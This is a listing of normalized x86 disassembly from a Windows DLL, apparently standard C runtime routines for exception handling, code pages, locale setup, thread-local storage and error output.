add ecx edi
xor ecx [ eax + edi ]
call sub_1000fe6e
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10016734
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_100166ea
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000fe6e
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000fe6e
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_1001671a
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10016734
mov eax [ ebp + 0xc ]
push rw-data
call sub_10013a10
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000fe6e
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10016701
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000fe6e
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_100121ec
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_1001221c
mov edi edi
push ebp
mov ebp esp
call sub_100126aa
push [ ebp + 0x8 ]
call sub_100124ff
push [ rw-data ]
call sub_1001319d
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_10012245
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1001229a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_100122b7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_100122db
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_1001674b
push r--data
push r--data
call sub_100122b7
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_10013a10
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_100153e7
call sub_10014bb6
mov eax r--data
mov [ esp ] r--data
call sub_1001229a
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
xor eax eax
push rw-data
call sub_10013a10
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10012360
push 0x18
push r--data
call sub_10012000
push 0x8
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10012477
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10012045
retn
mov [ rw-data ] ebx
push 0x8
call sub_1001142e
pop ecx
push [ ebp + 0x8 ]
call sub_10012270
push r--data
mov eax r--data
call sub_1001229a
pop ecx
push [ rw-data ]
call sub_1001319d
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_1001229a
pop ecx
push [ rw-data ]
call sub_1001319d
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_10013194
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_1001319d
mov edi eax
call sub_10013194
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_1001319d
mov edi eax
push [ rw-data ]
call sub_1001319d
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_100124b1
mov edi edi
push esi
call sub_10013194
mov esi eax
push esi
call sub_100126e3
push esi
call sub_10016213
push esi
call sub_1001381f
push esi
call sub_100169d7
push esi
call sub_100169c8
push esi
call sub_100167b6
push esi
call sub_10013acd
push esi
call sub_100167a5
push sub_1001248c
call sub_10013122
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_100124ff
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_10016ce0
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_10016ce0
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_10016180
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1001382e
add esp 0x14
push esi
call sub_10016180
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_10016180
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_10016bc3
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001382e
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_10016b4f
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1001382e
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_1001382e
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_100169e6
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1001382e
add esp 0x14
push r--data
push ebx
push edi
call sub_10016b4f
add esp 0xc
test eax eax
je r-xdata
sub_100126aa
push 0x3
call sub_10016ce0
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_100124ff
push 0xff
call sub_100124ff
pop ecx
pop ecx
push 0x3
call sub_10016ce0
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100126f2
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1001319d
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1001271a
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10012749
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_10010a00
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_100127ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10016ee5
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10014144
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10014144
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_10010a00
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10012940
push 0xc
push r--data
call sub_10012000
call sub_10013426
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100129db
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10012045
retn
push 0x20
call sub_1001221c
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_1000fe7d
pop ecx
sub_100129e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_10010024
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10012a60
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_100129e4
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10012749
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10010a00
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1001271a
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_100127ad
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10010a00
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1001271a
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10012c45
push 0x14
push r--data
call sub_10012000
or [ ebp - 0x20 ] 0xffffffff
call sub_10013426
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_10012940
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_100129e4
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_10013c4e
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_10012045
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_10012a60
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1001129f
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1000fe7d
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_1000fe7d
pop ecx
push 0xd
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10012da6
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_1000fe7d
pop ecx
sub_10012dfd
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1000fe7d
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1000fe7d
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1000fe7d
push [ esi + 0xc0 ]
call sub_1000fe7d
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10016f27
push [ edi ]
call sub_1000fe7d
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1000fe7d
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000fe7d
pop ecx
push [ esi + 0xb0 ]
call sub_1000fe7d
push [ esi + 0xbc ]
call sub_1000fe7d
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000fe7d
push [ esi + 0xbc ]
call sub_10017101
pop ecx
pop ecx
push eax
call sub_1000fe7d
pop ecx
push eax
call sub_1000fe7d
push [ esi + 0xbc ]
call sub_100170bc
pop ecx
pop ecx
sub_10012f46
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_10012fd5
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1001306e
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_10012f46
pop ecx
test esi esi
je r-xdata
push esi
call sub_10012fd5
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_10012dfd
pop ecx
sub_100130ac
push 0xc
push r--data
call sub_10012000
call sub_10013426
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_1001306e
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013116
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_10013426
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10012045
retn
push 0x20
call sub_1001221c
pop ecx
sub_10013122
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_100121ec
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_1001319d
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_100121ec
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_10013238
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_1001319d
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_10013289
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_1001319d
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_100113d7
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_100132c6
push 0xc
push r--data
call sub_10012000
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_100121ec
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001339b
push 0xc
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_10012f46
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100133a4
call sub_10012045
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_100133ad
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
